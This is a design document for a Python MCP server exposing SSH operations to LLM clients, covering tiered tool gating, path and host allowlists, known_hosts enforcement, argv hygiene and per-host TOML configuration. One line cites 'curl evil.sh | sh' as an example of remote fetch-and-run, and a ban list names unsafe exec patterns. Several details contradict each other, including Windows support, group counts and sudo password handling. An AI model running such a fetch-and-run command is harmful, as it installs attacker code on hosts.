# Python SSH MCP — Design Plan

Companion document to [AGENTS.md](AGENTS.md). AGENTS.md is the *how* (coding rules, FastMCP patterns); this is the *what* (scope, tiers, tool catalog, phased build).

---

## 1. Goals

1. Expose remote SSH operations as MCP tools consumable by LLM clients.
2. **Three independent access tiers** so operators can grant file manipulation without granting arbitrary shell.
3. Multi-host from day one via a connection pool keyed by `(user, host, port)` with host allowlisting.
4. SFTP-first for file ops — **no shell when a protocol primitive exists**. Shell fallbacks use fixed argv with `--` separators, never interpolation.
5. Strict `known_hosts` enforcement — fail closed on unknown or mismatched host keys.
6. Honest result shape. `stderr` is not a failure — we return `exit_code` and let the caller decide.
7. FastMCP 3 native: lifespan for the pool, tasks for long commands, tags for risk classification, OTel for tracing.

## 2. Non-goals

- Reimplementing a shell. Low-access tools are **bounded file operations**, not a sandboxed shell.
- Interactive TUIs / full-screen programs (`vim`, `htop`). Users needing those should SSH directly.
- Port forwarding, X11 forwarding, tunneling. Out of scope.
- Windows target hosts. Unix/Linux only; PRs welcome later.

---

## 3. Access tiers

Three independent boolean env vars, each gating a category of tools via a `Visibility` transform applied in the lifespan. Tools are tagged; gating is declarative.

**Tier** (risk) and **group** (domain) are **orthogonal**. Tier gates what mutation is possible; group gates which domain of tools is visible. Both are applied via `Visibility` on tags. See §12 for groups.

| Tier | Env flag | Default | Tags | What it unlocks |
|---|---|---|---|---|
| **read-only** | *(always on)* | — | `safe`, `read` | Host probes, session inspection, SFTP reads, `list`, `find`, `stat`, `download` |
| **low-access** | `ALLOW_LOW_ACCESS_TOOLS` | `false` | `low-access` | SFTP-mediated file mutation: `cp`, `mv`, `mkdir`, `delete`, `delete_folder`, `edit`, `patch`, `upload` |
| **exec** | `ALLOW_DANGEROUS_TOOLS` | `false` | `dangerous` | Arbitrary command execution (`exec_run`, `exec_run_streaming`, `exec_script`) |
| **sudo** | `ALLOW_SUDO` | `false` | `sudo` (implies `dangerous`) | `sudo_exec`; persistent su-shell reuse |

**Why split low-access from exec?** The common LLM task "patch this config file and restart nginx" is two separate capabilities. Granting arbitrary `exec` to patch a file is disproportionate — an LLM that needs to edit `/etc/nginx/nginx.conf` shouldn't be able to `curl evil.sh | sh`. With the split:

- An ops assistant can get `low-access` alone for routine file maintenance.
- A diagnostic assistant can get `read-only` only.
- Full remediation work needs the operator to flip `ALLOW_DANGEROUS_TOOLS`.

**Gate implementation** (in `ssh_lifespan`):

```python
if not settings.ALLOW_LOW_ACCESS_TOOLS:
    server.add_transform(Visibility(False, tags={"low-access"}))
if not settings.ALLOW_DANGEROUS_TOOLS:
    server.add_transform(Visibility(False, tags={"dangerous"}))
if not settings.ALLOW_SUDO:
    server.add_transform(Visibility(False, tags={"sudo"}))
```

`dangerous` implies the tool is hidden even from search transforms when disabled; same for `sudo`. A tool can carry multiple gating tags (e.g., `sudo_exec` has both `dangerous` and `sudo` — disabling either hides it).

---

## 4. Tool catalog

All tools are prefixed `ssh_`. Inputs are typed Pydantic models. Outputs are JSON-serializable dicts with stable keys.

### 4.1 Read-only (tier: always on)

| Tool | Transport | Purpose |
|---|---|---|
| `ssh_host_ping` | TCP + SSH handshake | Liveness probe; returns `{reachable, auth_ok, latency_ms, server_banner}` |
| `ssh_host_info` | fixed argv: `uname -a; cat /etc/os-release; uptime` | Host fingerprint |
| `ssh_host_disk_usage` | fixed argv: `df -PTh` | Disk usage, parsed |
| `ssh_host_processes` | fixed argv: `ps -eo pid,user,pcpu,pmem,comm --sort=-pcpu \| head -N` | Top processes |
| `ssh_known_hosts_verify` | — | Verify a host's key against known_hosts, report fingerprint |
| `ssh_session_list` | — | List active pooled connections |
| `ssh_session_stats` | — | Pool stats: open count, idle age, errors |
| `ssh_sftp_list` | SFTP `readdir` | Directory listing with `offset`/`limit` |
| `ssh_sftp_stat` | SFTP `stat` | File metadata (size, mode, mtime, owner, symlink target) |
| `ssh_sftp_download` | SFTP `get` | Read a remote file; base64-encoded bytes; size cap |
| `ssh_find` | fixed argv: `find <path> -maxdepth N -type T -name PATTERN` | Bounded, shell-free find |

`ssh_find` uses fixed argv; the `PATTERN` is passed as an argv element, never interpolated. Globbing is performed by `find`, not by a shell.

### 4.2 Low-access (tier: `ALLOW_LOW_ACCESS_TOOLS=true`)

All low-access tools:
1. Canonicalize every path (`realpath` on the remote) before the allowlist check.
2. Reject paths outside `SSH_PATH_ALLOWLIST`.
3. Prefer SFTP primitives; fall back to fixed-argv exec only when protocol can't do the job.
4. Are **idempotent where practical** and **atomic where practical** (tmp file + rename).

| Tool | Transport | Notes |
|---|---|---|
| `ssh_cp` | Preferred: SFTP `get`+`put` when under size cap; fallback: fixed argv `cp -a -- SRC DST` | `--` prevents flag injection; `-a` preserves mode/mtime |
| `ssh_mv` | Preferred: SFTP `rename`; fallback on `EXDEV`: fixed argv `mv -- SRC DST` | Atomic within filesystem |
| `ssh_mkdir` | SFTP `mkdir` with loop for `-p` behavior | Fails cleanly if parent missing and `parents=False` |
| `ssh_delete` | SFTP `remove` | Files only; rejects directories with a clear error |
| `ssh_delete_folder` | SFTP `rmdir` if empty; fixed argv `rm -rf -- PATH` if recursive requested | **Requires explicit `recursive=True`** + re-validated allowlist check immediately before exec; optional `dry_run` returns the walked tree without deleting |
| `ssh_edit` | SFTP `get` → modify in memory → SFTP `put` to `.tmp` → SFTP `rename` | Structured old_string→new_string with `occurrence` control; max file size cap (default 10 MiB); preserves mode |
| `ssh_patch` | SFTP `get` → apply unified diff via `unidiff` in-process → SFTP `put` → `rename` | Accepts a diff body; rejects fuzzy matches; reports hunks applied/rejected |
| `ssh_upload` | SFTP `put` to `.tmp` + `rename` | Base64-encoded bytes in; size cap; preserves caller-specified mode |

**Why pure-Python patch?** Avoids shelling out to `patch(1)` entirely — no argv to get wrong. `unidiff` is a small, well-tested library.

**Why `ssh_edit` exists separately from `ssh_patch`?** Edit is the common "change this one string in this one file" operation that dominates config tweaks. Patch is for multi-hunk diffs produced by tooling. Keep both; they're small.

### 4.3 Exec (tier: `ALLOW_DANGEROUS_TOOLS=true`)

| Tool | Transport | Notes |
|---|---|---|
| `ssh_exec_run` | `asyncssh.run` per-command channel | Returns `{stdout, stderr, exit_code, duration_ms, stdout_truncated, stderr_truncated}`. **Non-zero exit is not an error** (fixes reference's stderr-as-failure bug). Per-call `timeout`. |
| `ssh_exec_run_streaming` | `asyncssh.create_process` with chunked reads; FastMCP `task=TaskConfig(mode="required")` | For long commands; streams progress via the task channel; client polls; stdout/stderr capped and rotated |
| `ssh_exec_script` | Script body sent via stdin to `sh -s --` with optional argv | Never interpolates the script body into argv; `--` separator for positional args |

### 4.4 Sudo (tier: `ALLOW_SUDO=true` and `ALLOW_DANGEROUS_TOOLS=true`)

| Tool | Transport | Notes |
|---|---|---|
| `ssh_sudo_exec` | Persistent su-shell (borrowed pattern from reference) OR `sudo -n` per call, selected by config | Password never in argv; supplied to stdin of `sudo -S` or via a pre-established su-shell |
| `ssh_sudo_run_script` | `sudo sh -s --` over stdin | Same argv-hygiene rules as `ssh_exec_script` |

Sudo password sources, in preference order:
1. `SSH_SUDO_PASSWORD_CMD` — a local command that prints the password (e.g., `pass show ops/sudo`). Invoked per call; output not cached on disk.
2. OS keychain via `keyring`.
3. `SSH_SUDO_PASSWORD` env var (dev only; flagged as insecure at startup).
4. Passwordless sudoers entry (preferred in real deployments — no password needed).

---

## 5. Architecture

### 5.1 Module layout

```text
src/ssh_mcp/
├── __init__.py
├── __main__.py              # python -m ssh_mcp entry
├── run_server.py            # thin; calls mcp_server.run()
├── server.py                # FastMCP instance + tool imports
├── lifespan.py              # pool + known_hosts + visibility gates
├── config.py                # Pydantic Settings (env)
├── hosts.py                 # hosts.toml loader → per-host policy
├── ssh/
│   ├── pool.py              # ConnectionPool keyed by (user, host, port)
│   ├── connection.py        # SSHConnection wrapper (asyncssh)
│   ├── known_hosts.py       # loader + verifier
│   ├── sftp.py              # SFTP primitives with path validation
│   ├── exec.py              # exec + streaming exec
│   ├── sudo.py              # sudo / su-shell strategies
│   └── argv.py              # safe argv builders (no string interpolation)
├── services/
│   ├── path_policy.py       # canonicalize + allowlist check
│   ├── host_policy.py       # host allowlist
│   ├── audit.py             # structured audit events
│   ├── exec_service.py
│   ├── sftp_service.py
│   ├── edit_service.py      # in-memory edit + patch apply
│   └── sudo_service.py
├── models/
│   ├── results.py           # ExecResult, StatResult, ListResult, ...
│   └── inputs.py            # tool input models (for typing)
├── tools/
│   ├── __init__.py          # import submodules to register
│   ├── host_tools.py        # ping, info, disk_usage, processes
│   ├── session_tools.py
│   ├── sftp_read_tools.py   # list, stat, download, find
│   ├── low_access_tools.py  # cp, mv, mkdir, delete, delete_folder, edit, patch, upload
│   ├── exec_tools.py
│   └── sudo_tools.py
└── telemetry.py             # OTel helpers + redaction
```

Each `tools/*` module has only `@mcp_server.tool` definitions — no business logic. Logic lives in `services/`.

### 5.2 Layer responsibilities

1. **Tools layer** — thin. Validate with Pydantic, pull `pool` from `ctx.lifespan_context`, call service, return dict.
2. **Service layer** — policy (host/path allowlists, sudo gating, size/recursion caps), audit events, error normalization, correlation IDs.
3. **SSH layer** — raw transport. Only place that imports `asyncssh`. Argv builders live here. Path canonicalization on the remote side (running `realpath -e` under a fixed argv) lives here.

Transport-swap is local: if `asyncssh` ever becomes unsuitable, only the `ssh/` directory changes.

### 5.3 Connection pool

- Keyed by `(user, host, port)`.
- Lazy connect; reuse while idle < `SSH_IDLE_TIMEOUT` (default 300 s).
- Keepalive `SSH_KEEPALIVE_INTERVAL` (default 30 s).
- Per-key reconnect dedup (same pattern as reference's `connectionPromise`): concurrent callers wait on one in-flight connect.
- Max connections per key (default 4) for parallel channels; each command gets its own channel on a shared connection.
- **Idle reaper**: background task runs every 60 s and closes connections idle > `SSH_IDLE_TIMEOUT`. Reference pattern that reaps only on next `getConnection()` leaks FDs when traffic stops — we reap proactively.
- `close_all()` in lifespan finally block tears everything down cleanly.

### 5.3a ProxyJump / bastion chaining

Many production SSH topologies route through a bastion (jump host). `asyncssh` supports `tunnel=<outer_connection>` to open a second connection over the first.

- `hosts.toml` may set `proxy_jump = "bastion.example.com"` (or a list for multi-hop chains).
- The pool resolves the chain by opening the outer connection first, then using it as the tunnel for the inner connection. Each link uses its own allowlist entry and known_hosts check.
- Circular-reference detection: if `A → B → A`, abort at registration time, not at connect time.
- Caching: bastion connections are pooled independently and reused across many inner targets.

### 5.4 Known_hosts — strict

- Load from `SSH_KNOWN_HOSTS` at startup.
- `asyncssh` `known_hosts=` param wired through; no `None` fallback.
- Unknown host → `UnknownHost` error with instructions to verify out-of-band. **Never auto-accept** from a tool call.
- Mismatch → `HostKeyMismatch` with expected + actual fingerprint, logged at WARNING (security event).
- Optional operator-only tool `ssh_known_hosts_add` (tier: low-access + a dedicated `SSH_ALLOW_KNOWN_HOSTS_WRITE=true` flag) to pin a new host after human verification. Off by default.

### 5.5 Argv hygiene

One helper in `ssh/argv.py`:

```python
def build_argv(*parts: str | Path) -> list[str]:
    """Build a command as an argv list. No shell. No interpolation."""
    return [str(p) for p in parts]
```

All exec calls use `asyncssh.SSHClientConnection.create_process(command=..., shell=False)` with argv lists where the protocol allows, or `run(command_as_string)` where asyncssh requires a string — in which case we construct the string via `shlex.join(argv)` and never from format-strings on untrusted input.

Ban list (enforced by lint rule or code review):
- `f"cmd {untrusted}"` in `ssh/` or `services/`
- `.format(...)` on commands
- `subprocess.Popen(..., shell=True)` anywhere
- `os.system`

### 5.6 Path policy

`services/path_policy.py::canonicalize_and_check(conn, path) -> str`:
1. Run `readlink -f -- <path>` on the remote under fixed argv, with timeout.
2. Check the canonical result is inside at least one allowlisted root.
3. Reject if contains NUL or control characters.
4. Return canonical path for downstream use.

All low-access tools go through this function. No tool accepts a raw path.

### 5.7 Per-host configuration (`hosts.toml`)

Env vars alone cannot express per-host policy (different users, keys, allowlists, bastions). We use a file-based host registry in **TOML** (stdlib `tomllib` in 3.11+, zero extra dependency).

`hosts.toml` (path configurable via `SSH_HOSTS_FILE`, default `./hosts.toml`):

```toml
# Default policy applied to every host unless overridden.
[defaults]
user = "deploy"
port = 22
platform = "linux"
default_dir = "/opt/app"
sudo_mode = "per-call"               # "per-call" | "persistent-su"
path_allowlist = ["/opt/app", "/var/log"]
command_allowlist = []               # empty = any (when dangerous enabled)

# Default auth: use the operator's SSH agent, any key it offers.
[defaults.auth]
method = "agent"                     # "agent" | "key" | "password" (password disabled unless ALLOW_PASSWORD_AUTH=true)

[hosts.bastion]
hostname = "bastion.example.com"
user = "jumpuser"
# Bastions usually need no default_dir / path_allowlist since we don't operate on them directly.

[hosts.bastion.auth]
method = "agent"
# Pick exactly one identity from the agent by fingerprint. Equivalent to OpenSSH's
# IdentitiesOnly=yes + IdentityFile pointing at the public half.
identity_fingerprint = "SHA256:abc123...bastion-ops-key"

[hosts.db01]
hostname = "db01.internal"
user = "dbadmin"
proxy_jump = "bastion"               # routes through hosts.bastion
path_allowlist = ["/var/lib/postgresql/backups", "/etc/postgresql"]
sudo_mode = "persistent-su"

[hosts.db01.auth]
method = "agent"
# A DIFFERENT agent socket than the default — e.g., a scoped agent started only for DB ops.
identity_agent = "${XDG_RUNTIME_DIR}/ssh-agent-db.sock"
identity_fingerprint = "SHA256:def456...db-admin-key"
identities_only = true               # refuse to try any other identity from the agent

[hosts.legacy]
hostname = "legacy.internal"
user = "root"
# No agent here — this box needs a specific on-disk key with a passphrase
# stored in the OS keychain.
[hosts.legacy.auth]
method = "key"
key = "~/.ssh/id_legacy_rsa"
passphrase_cmd = "security find-generic-password -s ssh-legacy -w"  # macOS keychain

[hosts.web01]
hostname = "web01.internal"
proxy_jump = "bastion"
default_dir = "/var/www"
path_allowlist = ["/var/www", "/etc/nginx"]
command_allowlist = ["systemctl", "nginx", "tail", "grep"]
# Inherits [defaults.auth] — agent, any identity.
```

**Resolution order** (highest → lowest precedence):
1. Explicit tool argument (e.g., `user=...` passed to the tool call).
2. Per-host `[hosts.<name>.auth]` in `hosts.toml`.
3. Per-host top-level fields in `hosts.toml`.
4. `[defaults.auth]` + `[defaults]` block.
5. Env var (`SSH_DEFAULT_USER`, `SSH_DEFAULT_KEY`, etc.).
6. Built-in defaults.

**Host allowlist is the union** of `hosts.toml` keys + `SSH_HOSTS_ALLOWLIST` env var. An explicit empty `hosts.toml` is valid; the env var then becomes the sole source.

**Loader** (`hosts.py`):

```python
import tomllib
from pathlib import Path
from typing import Literal
from pydantic import BaseModel

class AuthPolicy(BaseModel):
    method: Literal["agent", "key", "password"] = "agent"

    # method == "agent"
    identity_agent: Path | None = None           # override SSH_AUTH_SOCK per host
    identity_fingerprint: str | None = None      # e.g. "SHA256:abc..."; selects one key
    identities_only: bool = False                # refuse other agent identities

    # method == "key"
    key: Path | None = None
    passphrase_cmd: str | None = None            # shell command that prints the passphrase

    # method == "password" (only honored if ALLOW_PASSWORD_AUTH=true)
    password_cmd: str | None = None              # never a literal password in the file

class HostPolicy(BaseModel):
    hostname: str
    user: str
    port: int = 22
    platform: str = "linux"
    default_dir: str | None = None
    sudo_mode: str = "per-call"
    path_allowlist: list[str] = []
    command_allowlist: list[str] = []
    proxy_jump: str | list[str] | None = None
    auth: AuthPolicy = AuthPolicy()

def load_hosts(path: Path) -> dict[str, HostPolicy]:
    ...
```

Validation at startup:
- Every `proxy_jump` reference points to an existing host key.
- No circular proxy chains (walk each chain; abort on repeat).
- Path allowlist entries are absolute.
- Warn if `command_allowlist` is empty while `ALLOW_DANGEROUS_TOOLS=true` (operator likely forgot to scope).
- When `method = "agent"` + `identity_fingerprint` set: verify at load that an agent is reachable and exposes the fingerprint. Fail-fast if not — better at startup than on the first tool call.
- When `method = "key"`: verify file exists and has mode `0600`; warn otherwise. Do not read the key into memory at load time; asyncssh does so at connect.
- Reject `method = "password"` unless `ALLOW_PASSWORD_AUTH=true` env flag is set.

Tools that accept `host` resolve to a `HostPolicy` before any SSH operation; the policy object is what the pool, path check, and sudo service consume.

### 5.7a Auth resolution — why identity-per-host matters

A single operator typically has multiple SSH identities (ops key, DB key, deploy key). Three production patterns we support:

**Pattern A: one agent, many keys, per-host selection by fingerprint.** Most common. The operator's `ssh-agent` holds all their keys. Each `hosts.<name>.auth` block names the specific fingerprint to offer for that host. asyncssh is given a filter over agent identities; with `identities_only = true`, non-matching identities are never offered to the server — avoids noisy auth failures and credential scanning footprints in server logs.

**Pattern B: multiple agent sockets.** Scoped agents: a short-lived agent unlocked only during the ops window holds the prod keys; a separate long-lived agent holds the staging keys. `identity_agent` overrides `SSH_AUTH_SOCK` per host. This is how `ssh-vault`, `sekey` on macOS, or a YubiKey agent setup usually work.

**Pattern C: on-disk key with passphrase from keychain.** No agent — a specific key file with a passphrase retrieved via `passphrase_cmd` (macOS Keychain, `pass`, Bitwarden CLI, etc.). The passphrase is read once per connect and never cached by the server.

**What we do NOT support:**
- Passphrase in the TOML file (any form).
- Password literals in the TOML file (any form).
- `agent_forwarding = true` — if anyone asks, say no. The MCP is a confused-deputy risk for agent forwarding.

**Why select identities explicitly?** OpenSSH servers often cap auth attempts at 6 and count each offered key as one. An operator with 10 agent keys will hit `Too many authentication failures` before the server considers a password. More importantly: offering every key to every host leaks the operator's full identity fingerprint set to any server they touch — including compromised ones. Identity-per-host is both ergonomic and a real confidentiality improvement.

**asyncssh mapping:**

| Our policy field | asyncssh kwarg |
|---|---|
| `method = "agent"`, no fingerprint | `agent_path=<socket>` (default from `SSH_AUTH_SOCK`), `client_keys=None` |
| `method = "agent"`, `identity_fingerprint = F` | `agent_path=<socket>`, `client_keys=[<matching agent key>]`, `agent_forward_path=None` |
| `method = "agent"`, `identities_only = true` | As above, plus no fallback to on-disk keys |
| `method = "key"` | `client_keys=[path]`, `passphrase=<from passphrase_cmd>`, `agent_path=None` |
| `method = "password"` | `password=<from password_cmd>`, `agent_path=None`, `client_keys=None` |

Implementation note: resolving `identity_fingerprint` to the actual asyncssh key object requires enumerating agent identities (`asyncssh.SSHAgentClient.get_keys()`) and matching by fingerprint at connect time. Cache the resolved key handle inside the pool entry for reuse across channels.

---

## 6. Result shape — fixing reference bugs

Reference treats any stderr as failure. We don't. Canonical exec result:

```python
class ExecResult(BaseModel):
    host: str
    exit_code: int                # non-zero is NOT an error
    stdout: str
    stderr: str
    stdout_bytes: int
    stderr_bytes: int
    stdout_truncated: bool
    stderr_truncated: bool
    duration_ms: int
    timed_out: bool               # explicit, separate from exit_code
    killed_by_signal: str | None
```

Errors (as raised MCP errors) are reserved for:
- Transport failures (connection refused, auth, host key)
- Timeouts that exceeded the grace period
- Policy rejections (host not allowed, path not allowed, dangerous disabled)
- Programmer errors (bad input after Pydantic validation somehow)

Non-zero exit codes, stderr content, and "file not found" from user commands are **data**, not errors. The caller decides what's a problem.

---

## 7. Security checklist

- [ ] Known_hosts enforced; no AutoAddPolicy
- [ ] Host allowlist enforced in every tool that takes `host`
- [ ] Path allowlist enforced (post-canonicalization) in every low-access tool
- [ ] Argv-only construction for exec; no f-strings or `%` formatting on commands
- [ ] `--` separator inserted before positional arguments in every fixed-argv command
- [ ] Sudo password never in argv or logs; fetched per-invocation from keyring/command
- [ ] Size caps on stdout/stderr, edit/patch, upload/download
- [ ] Recursion cap on `find`, `delete_folder`, SFTP listing
- [ ] Timeout on every remote operation; no unbounded blocking calls
- [ ] `timed_out` reported explicitly; `pkill -f` cleanup (borrowed from reference) with argv-escaped pattern
- [ ] OTel spans redact command bodies; log only length, host, exit_code, duration
- [ ] Audit event emitted for every `low-access`, `dangerous`, or `sudo` tool invocation with correlation ID

---

## 8. Observability

- **OTel** spans: `ssh.connect`, `ssh.auth`, `ssh.exec`, `ssh.sftp.op`, per-tool spans wrapping everything. Attribute policy from AGENTS.md §PI-4.
- **Audit log**: structured JSON line per mutating invocation. Fields: `ts`, `correlation_id`, `tool`, `tier`, `host`, `user`, `path_or_command_summary` (hashed, not raw), `result` (`ok`/`error`), `exit_code`, `duration_ms`.
- **Redaction**: hash any argv element that matches `--password=*`, `--token=*`, `--secret=*`; replace stdin payloads with `<len=N bytes>`.

---

## 9. Configuration surface

```python
class Settings(BaseSettings):
    # Identity / transport
    SSH_CONFIG_FILE: Path | None = None
    SSH_KNOWN_HOSTS: Path = Path.home() / ".ssh" / "known_hosts"
    SSH_DEFAULT_USER: str = "root"
    SSH_DEFAULT_KEY: Path | None = None

    # Allowlists
    SSH_HOSTS_ALLOWLIST: list[str] = []       # CSV or JSON; unions with hosts.toml keys
    SSH_HOSTS_BLOCKLIST: list[str] = []       # CSV or JSON; deny wins — see ADR-0015
    SSH_PATH_ALLOWLIST: list[str] = []
    SSH_COMMAND_ALLOWLIST: list[str] = []   # optional, for exec

    # Caps
    SSH_CONNECT_TIMEOUT: int = 10
    SSH_COMMAND_TIMEOUT: int = 60
    SSH_IDLE_TIMEOUT: int = 300
    SSH_KEEPALIVE_INTERVAL: int = 30
    SSH_MAX_CONNECTIONS_PER_HOST: int = 4
    SSH_STDOUT_CAP_BYTES: int = 1 << 20     # 1 MiB
    SSH_STDERR_CAP_BYTES: int = 1 << 20
    SSH_EDIT_MAX_FILE_BYTES: int = 10 << 20 # 10 MiB
    SSH_UPLOAD_MAX_FILE_BYTES: int = 256 << 20
    SSH_FIND_MAX_DEPTH: int = 10
    SSH_FIND_MAX_RESULTS: int = 10_000
    SSH_DELETE_FOLDER_MAX_ENTRIES: int = 10_000

    # Access tiers (default-deny)
    ALLOW_LOW_ACCESS_TOOLS: bool = False
    ALLOW_DANGEROUS_TOOLS: bool = False
    ALLOW_SUDO: bool = False
    SSH_ALLOW_KNOWN_HOSTS_WRITE: bool = False

    # Sudo
    SSH_SUDO_PASSWORD_CMD: str | None = None   # e.g. "pass show ops/sudo"
    SSH_SUDO_MODE: Literal["per-call", "persistent-su"] = "per-call"

    # Per-host config file (optional)
    SSH_HOSTS_FILE: Path | None = Path("hosts.toml")

    # Tool groups (see §12) — comma-separated, empty = all groups enabled
    SSH_ENABLED_GROUPS: list[str] = Field(default_factory=list)

    # Observability
    VERSION: str = "0.1.0"
    LOG_LEVEL: str = "INFO"
    OTEL_ENABLED: bool = True
```

---

## 10. Build phases

**Phase 0 — skeleton (1 day)**
- Package layout, `pyproject.toml`, `fastmcp.json`, `__main__`, `run_server`, empty `server`, lifespan with no-op pool.
- CI: ruff + mypy + pytest green on empty suite.

**Phase 1 — read-only (2–3 days)**
- `ssh/connection.py` + `pool.py` + `known_hosts.py`.
- Tools: `ping`, `host_info`, `host_disk_usage`, `host_processes`, `known_hosts_verify`, `session_list`, `session_stats`, `sftp_list`, `sftp_stat`, `sftp_download`, `find`.
- Integration tests against a local sshd in Docker (linuxserver/openssh-server).

**Phase 2 — low-access tier (2–3 days)**
- `services/path_policy.py`.
- Tools: `mkdir`, `delete`, `delete_folder`, `cp`, `mv`, `upload`, `edit`, `patch`.
- Tests for path traversal, recursion caps, atomic rename, cross-FS `mv` fallback.
- Wire `Visibility(False, tags={"low-access"})` gate in lifespan.

**Phase 3 — exec tier (1–2 days)**
- `ssh/exec.py` with per-command channels.
- Tools: `exec_run`, `exec_script`, `exec_run_streaming` (with FastMCP tasks + Redis docket in prod).
- Timeout + pkill cleanup (borrowed from reference).
- Non-zero-exit-is-not-an-error semantics baked in.

**Phase 4 — sudo tier (1–2 days)**
- `ssh/sudo.py` with both `per-call` and `persistent-su` strategies.
- Tools: `sudo_exec`, `sudo_run_script`.
- Password sourcing (`PASSWORD_CMD`, keyring, env).

**Phase 5 — polish (2 days)**
- OTel spans in transport layer with redaction.
- Audit log emitter.
- Skills provider wired for operator runbooks (incident response, backup restore).
- `BM25SearchTransform` evaluated; enable only if catalog grows beyond ~30 tools.
- README with setup, allowlist format, key rotation runbook.

Total: ~10 working days.

---

## 11. Open questions

1. **Persistent vs per-call sudo**: a persistent su-shell is cleaner for repeated sudo calls but adds state (the shell can get into weird modes). Lean: **per-call as default**, persistent-su as opt-in via `sudo_mode = "persistent-su"` in `hosts.toml`. Resolve in Phase 4 by benchmarking latency.
2. **`ssh_edit` semantics**: should it match Claude Code's Edit tool (old_string/new_string with uniqueness check) or accept a list of replacements? Lean: start with single-replacement + `occurrence_index: int | "all"`, like Edit.
3. ~~**Per-host config file**~~ **Resolved** (see §5.7): TOML registry (`hosts.toml`) with a `[defaults]` block and per-host overrides. Landed in Phase 1, not deferred. Env vars remain the fallback for single-host quick-start setups.
4. **Host allowlist format**: exact hostnames only, or support CIDR / glob? Lean: exact hostnames + explicit list of IPs; reject globs for now.
5. **Redis dependency for tasks**: required in prod or optional? Lean: optional, with in-memory docket as dev default and a startup warning if `ALLOW_DANGEROUS_TOOLS=true` + in-memory backend (task loss on crash is bad for long-running exec).
6. **Hooks (pre/post-connect, pre/post-command)**: a hook system for side effects (slack notifications, audit bridges, environment setup) widens the attack surface. Lean: **defer**. Audit logging + OTel cover the observability need; anything more complex can be an external middleware layer subscribed to the MCP stream. Revisit if operators ask. (Resolved: hook infrastructure landed — see `services/hooks.py`.)
7. **Workflow-level tools (backup/restore, db_dump, deploy, service_status)**: baking compositions into the server as first-class tools grows the audit surface fast. Lean: **keep out of the transport**. Expose them as operator runbooks via the FastMCP Skills provider (AGENTS.md §PI-6). The MCP server stays a thin, auditable primitive; workflow composition lives above it.
8. **Tool activation style**: large catalogs pressure small-context LLMs. Our fix is tier `Visibility` + the group `SSH_ENABLED_GROUPS` knob (§12), both using native FastMCP primitives. Open: should we default to **all groups enabled**, or **minimal (host + session + sftp-read) enabled** for first-run safety? Lean: minimal default, operators opt in.

---

## 12. Tool groups — orthogonal to tiers

Large tool catalogs (we ship 52 tools) choke small-context LLMs. Our fix is a group dimension orthogonal to the tier dimension, both implemented with native FastMCP `Visibility` transforms.

Every tool carries two kinds of tag:

| Dimension | Example tags | Gated by |
|---|---|---|
| **Tier** (risk) | `safe` / `low-access` / `dangerous` / `sudo` | `ALLOW_*` env flags → `Visibility` transform |
| **Group** (domain) | `group:host` / `group:session` / `group:sftp-read` / `group:file-ops` / `group:exec` / `group:sudo` / `group:keys` | `SSH_ENABLED_GROUPS` env / `hosts.toml` → `Visibility` transform |

Visibility is an **AND** across both dimensions: a tool must pass its tier gate AND its group gate. Either failure hides the tool.

```python
# lifespan.py
enabled = set(settings.SSH_ENABLED_GROUPS or DEFAULT_GROUPS)
for group in ALL_GROUPS:
    if group not in enabled:
        server.add_transform(Visibility(False, tags={f"group:{group}"}))
```

Default groups (when `SSH_ENABLED_GROUPS` is empty):

```python
DEFAULT_GROUPS = {"host", "session", "sftp-read"}   # read-only safe default
ALL_GROUPS = {"host", "session", "sftp-read", "file-ops", "exec", "sudo", "keys"}
```

Example:

```bash
# Read-only diagnostics MCP (smallest context)
SSH_ENABLED_GROUPS="host,session,sftp-read"

# Configuration-management MCP (no arbitrary shell)
ALLOW_LOW_ACCESS_TOOLS=true
SSH_ENABLED_GROUPS="host,session,sftp-read,file-ops"

# Full power MCP (only for trusted ops users)
ALLOW_LOW_ACCESS_TOOLS=true
ALLOW_DANGEROUS_TOOLS=true
ALLOW_SUDO=true
SSH_ENABLED_GROUPS="host,session,sftp-read,file-ops,exec,sudo,keys"
```

**Per-host group overrides** (future, nice-to-have): `hosts.toml` may restrict groups per host — e.g., `bastion` allows only `host` + `session`; `db01` allows `file-ops` but not `exec`. Implement by emitting `tags={f"host:{name}:{group}"}` at registration time and a middleware that checks the `host` argument against the current tool call. Defer until real operator feedback says it matters.

The `Visibility` gate also filters tool-search results (AGENTS.md §PI-8). Context savings and security gating come from the same mechanism — no bespoke activation logic.

---

## 13. Design properties — at a glance

The shipped server combines these properties. Each row is non-negotiable and is what makes the difference between "works" and "safe to hand an LLM".

| Property | Shape |
|---|---|
| Hosts | Multi-host via `hosts.toml` + env fallback |
| ProxyJump | Recursive with circular-check at load time |
| File ops | Full SFTP + low-access tier (`cp`, `mv`, `mkdir`, `delete`, `delete_folder`, `edit`, `patch`, `upload`, `download`, `deploy`) |
| `stderr` in result | Data, never auto-failure; `exit_code` authoritative |
| known_hosts | Strict, fail-closed; explicit `ssh_known_hosts_add` behind a dedicated flag for first-time pinning |
| Path allowlist | Canonicalized on the remote + per-host overrides; case-insensitive on Windows |
| Auth | agent, key (with passphrase_cmd), password (disabled by default) |
| Sudo password source | `SSH_SUDO_PASSWORD_CMD` → keyring → env (rejected at startup) |
| Access gating | Four tiers × eight groups (orthogonal `Visibility` gates) |
| Output buffering | Capped + explicit truncation flag; streaming via FastMCP tasks |
| Command injection | Argv lists, `--` separators, no interpolation; banned via lint rule |
| Connection reaper | Background reaper every 60 s |
| Per-host policy | `hosts.toml` — user, key, allowlists, restricted paths, sudo mode, platform, proxy, default_dir |
| Workflow tools (backup/db/deploy) | Out of the transport — exposed as operator runbooks via Skills provider |
| Hooks | `STARTUP`/`SHUTDOWN`/`PRE_TOOL_CALL`/`POST_TOOL_CALL` registry; no hooks shipped by default |
| Observability | OTel spans + structured audit log (path/command SHA-256 hashed), with redaction |
| Testing | Unit (fake transport) + integration (docker sshd) + FakeSFTP for Windows-target coverage |
